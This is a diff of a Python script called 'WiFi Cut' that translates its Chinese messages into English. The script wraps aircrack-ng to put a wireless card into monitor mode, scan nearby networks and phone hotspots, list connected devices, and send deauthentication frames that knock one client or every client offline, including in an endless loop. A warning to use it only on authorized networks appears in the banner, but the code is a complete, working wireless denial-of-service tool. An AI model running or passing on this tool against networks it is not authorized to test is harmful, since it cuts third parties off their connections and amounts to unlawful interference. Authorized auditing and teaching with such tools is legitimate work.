@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-WiFi Cut - Kali Linux WiFi 扫描与断开连接工具
-仅用于授权的安全测试、自有网络审计与教育目的。
+WiFi Cut - WiFi scanner and deauth tool for Kali Linux
+For authorized security testing, owned-network auditing, and education only.
 """
 
 import argparse
@@ -15,9 +15,9 @@ import tempfile
 import time
 from dataclasses import dataclass, field
 from pathlib import Path
-from typing import Dict, List, Optional, Set, Tuple
+from typing import Dict, List, Optional, Tuple
 
-# ── 颜色 ──────────────────────────────────────────────────────────────────────
+# ── Colors ────────────────────────────────────────────────────────────────────
 R  = "\033[91m"
 G  = "\033[92m"
 Y  = "\033[93m"
@@ -30,11 +30,11 @@ RS = "\033[0m"
 
 BANNER = f"""
 {BD}{C}╔══════════════════════════════════════════════════════════╗
-║              WiFi Cut  -  无线网络切断工具               ║
-║          扫描附近 WiFi / 热点  ·  断开已连接设备         ║
+║              WiFi Cut  -  Wireless Network Tool          ║
+║        Scan WiFi / Hotspots  ·  Disconnect Clients       ║
 ╚══════════════════════════════════════════════════════════╝{RS}
-{R}  ⚠  警告：仅在你拥有或已获书面授权的网络上使用！{RS}
-{R}  ⚠  未经授权干扰他人网络在多数国家/地区属于违法行为。{RS}
+{R}  ⚠  WARNING: Use only on networks you own or are authorized to test!{RS}
+{R}  ⚠  Unauthorized interference is illegal in most jurisdictions.{RS}
 """
 
 
@@ -57,11 +57,10 @@ class Network:
 
     @property
     def display_name(self) -> str:
-        name = self.essid if self.essid else "<隐藏网络>"
-        return name
+        return self.essid if self.essid else "<Hidden>"
 
 
-# ── 工具函数 ──────────────────────────────────────────────────────────────────
+# ── Helpers ───────────────────────────────────────────────────────────────────
 
 def run_cmd(cmd: List[str], timeout: int = 30) -> Tuple[int, str, str]:
     try:
@@ -70,14 +69,14 @@ def run_cmd(cmd: List[str], timeout: int = 30) -> Tuple[int, str, str]:
         )
         return r.returncode, r.stdout, r.stderr
     except subprocess.TimeoutExpired:
-        return -1, "", "命令超时"
+        return -1, "", "Command timed out"
     except FileNotFoundError:
-        return -1, "", f"找不到命令: {cmd[0]}"
+        return -1, "", f"Command not found: {cmd[0]}"
 
 
 def require_root():
     if os.geteuid() != 0:
-        print(f"{R}错误：需要 root 权限。请使用 sudo 运行。{RS}")
+        print(f"{R}Error: root privileges required. Run with sudo.{RS}")
         sys.exit(1)
 
 
@@ -88,8 +87,8 @@ def check_dependencies():
         if code != 0:
             missing.append(tool)
     if missing:
-        print(f"{R}缺少依赖：{', '.join(missing)}{RS}")
-        print(f"{Y}在 Kali 上安装：sudo apt install aircrack-ng iw{RS}")
+        print(f"{R}Missing dependencies: {', '.join(missing)}{RS}")
+        print(f"{Y}Install on Kali: sudo apt install aircrack-ng iw{RS}")
         sys.exit(1)
 
 
@@ -106,46 +105,43 @@ def get_wifi_interfaces() -> List[str]:
 
 
 def kill_conflicting_processes():
-    print(f"{GR}正在终止可能冲突的进程...{RS}")
+    print(f"{GR}Killing conflicting processes...{RS}")
     run_cmd(["airmon-ng", "check", "kill"], timeout=15)
 
 
 def start_monitor(iface: str) -> str:
-    """将网卡切换到 monitor 模式，返回 monitor 接口名。"""
+    """Switch interface to monitor mode and return monitor interface name."""
     kill_conflicting_processes()
     code, out, err = run_cmd(["airmon-ng", "start", iface], timeout=20)
     combined = out + err
 
-    # airmon-ng 输出形如 "monitor mode enabled on [wlan0mon]"
     m = re.search(r"\[(\w+)\]", combined)
     if m:
         return m.group(1)
 
-    # 有些驱动直接在同一接口上启用 monitor
     code2, out2, _ = run_cmd(["iw", "dev"])
     for line in out2.splitlines():
         m2 = re.match(r"\s*Interface\s+(\w+)", line)
         if m2 and m2.group(1).startswith(iface):
             return m2.group(1)
 
-    # 常见命名
     for candidate in (f"{iface}mon", iface):
         code3, out3, _ = run_cmd(["iw", "dev", candidate, "info"])
         if code3 == 0 and "monitor" in out3.lower():
             return candidate
 
-    print(f"{R}无法启用 monitor 模式。输出：{combined}{RS}")
+    print(f"{R}Failed to enable monitor mode. Output: {combined}{RS}")
     sys.exit(1)
 
 
 def stop_monitor(mon_iface: str, original_iface: str):
-    print(f"{GR}正在恢复网卡模式...{RS}")
+    print(f"{GR}Restoring interface mode...{RS}")
     run_cmd(["airmon-ng", "stop", mon_iface], timeout=15)
     run_cmd(["airmon-ng", "stop", original_iface], timeout=15)
 
 
 def parse_airodump_csv(prefix: str) -> Tuple[Dict[str, Network], Dict[str, List[Client]]]:
-    """解析 airodump-ng 生成的 CSV 文件。"""
+    """Parse airodump-ng CSV output."""
     networks: Dict[str, Network] = {}
     clients_by_bssid: Dict[str, List[Client]] = {}
 
@@ -164,7 +160,6 @@ def parse_airodump_csv(prefix: str) -> Tuple[Dict[str, Network], Dict[str, List[
 
         header = lines[0]
         if "BSSID" in header and "ESSID" in header:
-            # AP 列表
             for row in csv.reader(lines[1:]):
                 if len(row) < 14:
                     continue
@@ -181,7 +176,6 @@ def parse_airodump_csv(prefix: str) -> Tuple[Dict[str, Network], Dict[str, List[
                 networks[bssid] = net
 
         elif "Station MAC" in header and "BSSID" in header:
-            # 客户端列表
             for row in csv.reader(lines[1:]):
                 if len(row) < 6:
                     continue
@@ -207,12 +201,12 @@ def parse_airodump_csv(prefix: str) -> Tuple[Dict[str, Network], Dict[str, List[
 
 
 def scan_networks(mon_iface: str, duration: int = 15) -> Dict[str, Network]:
-    """扫描附近 WiFi 网络及已连接设备。"""
+    """Scan nearby WiFi networks and connected clients."""
     tmp_dir = tempfile.mkdtemp(prefix="wificut_")
     prefix = os.path.join(tmp_dir, "scan")
 
-    print(f"\n{C}正在扫描附近无线网络（{duration} 秒）...{RS}")
-    print(f"{GR}包括普通 WiFi、路由器、手机热点（流量共享）等{RS}\n")
+    print(f"\n{C}Scanning wireless networks ({duration}s)...{RS}")
+    print(f"{GR}Includes routers, WiFi APs, and phone hotspots/tethering{RS}\n")
 
     proc = subprocess.Popen(
         ["airodump-ng", "--output-format", "csv", "-w", prefix, mon_iface],
@@ -222,7 +216,7 @@ def scan_networks(mon_iface: str, duration: int = 15) -> Dict[str, Network]:
 
     for i in range(duration):
         remaining = duration - i
-        print(f"\r  {GR}扫描中... 剩余 {remaining:2d} 秒{RS}", end="", flush=True)
+        print(f"\r  {GR}Scanning... {remaining:2d}s remaining{RS}", end="", flush=True)
         time.sleep(1)
 
     proc.send_signal(signal.SIGINT)
@@ -231,11 +225,10 @@ def scan_networks(mon_iface: str, duration: int = 15) -> Dict[str, Network]:
     except subprocess.TimeoutExpired:
         proc.kill()
 
-    print(f"\r  {G}扫描完成！{RS}                    ")
+    print(f"\r  {G}Scan complete!{RS}                         ")
 
     networks, _ = parse_airodump_csv(prefix)
 
-    # 清理临时文件
     for f in Path(tmp_dir).glob("*"):
         f.unlink(missing_ok=True)
     os.rmdir(tmp_dir)
@@ -245,7 +238,7 @@ def scan_networks(mon_iface: str, duration: int = 15) -> Dict[str, Network]:
 
 def display_networks(networks: Dict[str, Network]):
     if not networks:
-        print(f"{Y}未检测到任何 WiFi 网络。请确认网卡支持 monitor 模式且附近有信号。{RS}")
+        print(f"{Y}No WiFi networks detected. Check monitor mode support and nearby signals.{RS}")
         return
 
     sorted_nets = sorted(
@@ -255,7 +248,7 @@ def display_networks(networks: Dict[str, Network]):
     )
 
     print(f"\n{BD}{'─' * 78}{RS}")
-    print(f"{BD}  {'序号':<4} {'名称':<22} {'BSSID':<18} {'信道':<5} {'信号':<6} {'加密':<8} {'设备数'}{RS}")
+    print(f"{BD}  {'#':<4} {'Name':<22} {'BSSID':<18} {'CH':<5} {'Signal':<6} {'Enc':<8} {'Clients'}{RS}")
     print(f"{BD}{'─' * 78}{RS}")
 
     for idx, net in enumerate(sorted_nets, 1):
@@ -272,19 +265,19 @@ def display_networks(networks: Dict[str, Network]):
         )
 
     print(f"{BD}{'─' * 78}{RS}")
-    print(f"{GR}  📱 = 可能是手机热点/流量共享{RS}\n")
+    print(f"{GR}  📱 = likely phone hotspot / tethering{RS}\n")
 
 
 def display_clients(net: Network):
-    print(f"\n{BD}目标网络：{W}{net.display_name}{RS} ({net.bssid})")
+    print(f"\n{BD}Target network: {W}{net.display_name}{RS} ({net.bssid})")
     print(f"{BD}{'─' * 50}{RS}")
 
     if not net.clients:
-        print(f"{Y}  暂未检测到已连接设备（可能设备较少或扫描时间不够）{RS}")
-        print(f"{GR}  仍可对 AP 广播 deauth 以断开所有客户端{RS}")
+        print(f"{Y}  No connected clients detected (low traffic or short scan){RS}")
+        print(f"{GR}  You can still broadcast deauth frames to disconnect all clients{RS}")
         return
 
-    print(f"  {'序号':<4} {'设备 MAC':<20} {'信号':<8} {'数据包'}")
+    print(f"  {'#':<4} {'Client MAC':<20} {'Signal':<8} {'Packets'}")
     print(f"  {'─' * 45}")
     for idx, client in enumerate(net.clients, 1):
         print(f"  {idx:<4} {client.mac:<20} {client.power:<8} {client.packets}")
@@ -299,20 +292,20 @@ def deauth_attack(
     interval: float = 1.0,
 ):
     """
-    发送 deauth 帧断开设备连接。
-    count=0 表示持续攻击直到用户中断。
+    Send deauth frames to disconnect clients.
+    count=0 means continuous attack until user interrupts.
     """
-    target_desc = client_mac if client_mac else "所有已连接设备"
-    print(f"\n{R}{BD}▶ 正在断开：{target_desc}{RS}")
-    print(f"{GR}  目标 AP：{bssid}{RS}")
+    target_desc = client_mac if client_mac else "all connected clients"
+    print(f"\n{R}{BD}▶ Disconnecting: {target_desc}{RS}")
+    print(f"{GR}  Target AP: {bssid}{RS}")
     if count == 0:
-        print(f"{Y}  模式：持续攻击（Ctrl+C 停止）{RS}")
+        print(f"{Y}  Mode: continuous (Ctrl+C to stop){RS}")
     else:
-        print(f"{GR}  发送 {count} 组 deauth 帧{RS}")
+        print(f"{GR}  Sending {count} deauth burst(s){RS}")
 
     cmd = ["aireplay-ng", "-0"]
     if count == 0:
-        cmd.append("0")  # aireplay-ng: 0 = 持续
+        cmd.append("0")
     else:
         cmd.append(str(count))
     cmd.extend(["-a", bssid])
@@ -321,7 +314,6 @@ def deauth_attack(
     cmd.append(mon_iface)
 
     if count == 0:
-        # 持续模式：循环发送
         burst = 10
         total_sent = 0
         try:
@@ -332,16 +324,16 @@ def deauth_attack(
                 burst_cmd.append(mon_iface)
                 code, out, err = run_cmd(burst_cmd, timeout=burst + 10)
                 total_sent += burst
-                print(f"\r  {R}已发送 deauth 帧组数：{total_sent}{RS}", end="", flush=True)
+                print(f"\r  {R}Deauth bursts sent: {total_sent}{RS}", end="", flush=True)
                 time.sleep(interval)
         except KeyboardInterrupt:
-            print(f"\n{Y}  攻击已停止。{RS}")
+            print(f"\n{Y}  Attack stopped.{RS}")
     else:
         code, out, err = run_cmd(cmd, timeout=count * 3 + 30)
         if code == 0:
-            print(f"{G}  deauth 攻击完成。{RS}")
+            print(f"{G}  Deauth attack complete.{RS}")
         else:
-            print(f"{R}  攻击可能失败：{err or out}{RS}")
+            print(f"{R}  Attack may have failed: {err or out}{RS}")
 
 
 def interactive_mode(mon_iface: str):
@@ -350,13 +342,13 @@ def interactive_mode(mon_iface: str):
         display_networks(networks)
 
         if not networks:
-            choice = input(f"{C}重新扫描? (y/n): {RS}").strip().lower()
+            choice = input(f"{C}Scan again? (y/n): {RS}").strip().lower()
             if choice != "y":
                 break
             continue
 
         try:
-            sel = input(f"{C}选择目标序号（0=退出）: {RS}").strip()
+            sel = input(f"{C}Select target # (0=quit): {RS}").strip()
             if sel == "0" or not sel:
                 break
             idx = int(sel)
@@ -366,39 +358,39 @@ def interactive_mode(mon_iface: str):
                 reverse=True,
             )
             if idx < 1 or idx > len(sorted_nets):
-                print(f"{R}无效序号{RS}")
+                print(f"{R}Invalid selection{RS}")
                 continue
             target = sorted_nets[idx - 1]
         except ValueError:
-            print(f"{R}请输入数字{RS}")
+            print(f"{R}Please enter a number{RS}")
             continue
 
         display_clients(target)
 
-        print(f"{BD}断开选项：{RS}")
-        print(f"  1. 断开该 WiFi 上所有设备")
-        print(f"  2. 断开指定设备")
-        print(f"  3. 持续断开所有设备（直到手动停止）")
-        print(f"  0. 返回扫描")
+        print(f"{BD}Disconnect options:{RS}")
+        print(f"  1. Disconnect all clients on this WiFi")
+        print(f"  2. Disconnect a specific client")
+        print(f"  3. Continuous disconnect (until stopped)")
+        print(f"  0. Back to scan")
 
-        opt = input(f"{C}选择操作: {RS}").strip()
+        opt = input(f"{C}Choose action: {RS}").strip()
 
         if opt == "0":
             continue
         elif opt == "1":
-            count = input(f"{C}发送 deauth 组数（默认 20）: {RS}").strip()
+            count = input(f"{C}Deauth burst count (default 20): {RS}").strip()
             count = int(count) if count.isdigit() else 20
             deauth_attack(mon_iface, target.bssid, count=count)
         elif opt == "2":
             if not target.clients:
-                print(f"{Y}未检测到客户端，将断开所有设备{RS}")
+                print(f"{Y}No clients detected — disconnecting all{RS}")
                 deauth_attack(mon_iface, target.bssid, count=20)
             else:
-                csel = input(f"{C}选择设备序号: {RS}").strip()
+                csel = input(f"{C}Select client #: {RS}").strip()
                 try:
                     ci = int(csel)
                     if 1 <= ci <= len(target.clients):
-                        count = input(f"{C}发送 deauth 组数（默认 20）: {RS}").strip()
+                        count = input(f"{C}Deauth burst count (default 20): {RS}").strip()
                         count = int(count) if count.isdigit() else 20
                         deauth_attack(
                             mon_iface,
@@ -407,86 +399,83 @@ def interactive_mode(mon_iface: str):
                             count=count,
                         )
                     else:
-                        print(f"{R}无效序号{RS}")
+                        print(f"{R}Invalid selection{RS}")
                 except ValueError:
-                    print(f"{R}请输入数字{RS}")
+                    print(f"{R}Please enter a number{RS}")
         elif opt == "3":
             deauth_attack(mon_iface, target.bssid, count=0)
         else:
-            print(f"{R}无效选项{RS}")
+            print(f"{R}Invalid option{RS}")
 
 
 def main():
     parser = argparse.ArgumentParser(
-        description="WiFi Cut - Kali WiFi 扫描与断开工具",
+        description="WiFi Cut - Kali WiFi scanner and disconnect tool",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-示例:
-  sudo python3 wifi_cut.py                    # 交互模式
-  sudo python3 wifi_cut.py -i wlan0           # 指定网卡
-  sudo python3 wifi_cut.py -i wlan0 --scan 30 # 扫描 30 秒
+Examples:
+  sudo python3 wifi_cut.py                    # interactive mode
+  sudo python3 wifi_cut.py -i wlan0           # specify interface
+  sudo python3 wifi_cut.py -i wlan0 --scan 30 # scan for 30 seconds
   sudo python3 wifi_cut.py -i wlan0 -b AA:BB:CC:DD:EE:FF --deauth-all
         """,
     )
-    parser.add_argument("-i", "--interface", help="无线网卡接口名（如 wlan0）")
-    parser.add_argument("--scan", type=int, default=15, metavar="SEC", help="扫描时长（秒）")
-    parser.add_argument("-b", "--bssid", help="目标 AP 的 BSSID")
-    parser.add_argument("-c", "--client", help="目标客户端 MAC（可选）")
-    parser.add_argument("--deauth-all", action="store_true", help="断开 AP 上所有设备")
-    parser.add_argument("--deauth-count", type=int, default=20, help="deauth 帧组数")
-    parser.add_argument("--continuous", action="store_true", help="持续 deauth 直到中断")
+    parser.add_argument("-i", "--interface", help="Wireless interface (e.g. wlan0)")
+    parser.add_argument("--scan", type=int, default=15, metavar="SEC", help="Scan duration in seconds")
+    parser.add_argument("-b", "--bssid", help="Target AP BSSID")
+    parser.add_argument("-c", "--client", help="Target client MAC (optional)")
+    parser.add_argument("--deauth-all", action="store_true", help="Disconnect all clients on AP")
+    parser.add_argument("--deauth-count", type=int, default=20, help="Number of deauth bursts")
+    parser.add_argument("--continuous", action="store_true", help="Continuous deauth until interrupted")
     args = parser.parse_args()
 
     print(BANNER)
     require_root()
     check_dependencies()
 
-    # 选择网卡
     ifaces = get_wifi_interfaces()
     if not ifaces:
-        print(f"{R}未找到无线网卡接口{RS}")
+        print(f"{R}No wireless interfaces found{RS}")
         sys.exit(1)
 
     if args.interface:
         iface = args.interface
         if iface not in ifaces:
-            print(f"{Y}警告：{iface} 不在检测到的接口列表 {ifaces} 中，仍尝试使用{RS}")
+            print(f"{Y}Warning: {iface} not in detected list {ifaces}, still trying{RS}")
     else:
-        print(f"{C}检测到无线网卡：{RS}")
+        print(f"{C}Detected wireless interfaces:{RS}")
         for i, name in enumerate(ifaces, 1):
             print(f"  {i}. {name}")
         if len(ifaces) == 1:
             iface = ifaces[0]
-            print(f"{GR}自动选择：{iface}{RS}")
+            print(f"{GR}Auto-selected: {iface}{RS}")
         else:
-            sel = input(f"{C}选择网卡序号: {RS}").strip()
+            sel = input(f"{C}Select interface #: {RS}").strip()
             try:
                 iface = ifaces[int(sel) - 1]
             except (ValueError, IndexError):
-                print(f"{R}无效选择{RS}")
+                print(f"{R}Invalid selection{RS}")
                 sys.exit(1)
 
-    print(f"\n{G}使用网卡：{iface}{RS}")
+    print(f"\n{G}Using interface: {iface}{RS}")
     mon_iface = start_monitor(iface)
-    print(f"{G}Monitor 模式：{mon_iface}{RS}")
+    print(f"{G}Monitor mode: {mon_iface}{RS}")
 
     try:
         if args.bssid and (args.deauth_all or args.client or args.continuous):
-            # 命令行直接攻击模式
             count = 0 if args.continuous else args.deauth_count
             deauth_attack(mon_iface, args.bssid, args.client, count=count)
         elif args.bssid:
-            # 仅扫描指定网络信息
             networks = scan_networks(mon_iface, args.scan)
             if args.bssid in networks:
                 display_clients(networks[args.bssid])
             else:
-                print(f"{Y}未在扫描结果中找到 {args.bssid}{RS}")
+                print(f"{Y}BSSID not found in scan results: {args.bssid}{RS}")
         else:
             interactive_mode(mon_iface)
     finally:
         stop_monitor(mon_iface, iface)
-        print(f"\n{G}完成。网卡已恢复。{RS}")
+        print(f"\n{G}Done. Interface restored.{RS}")
 
 
 if __name__ == "__main__":
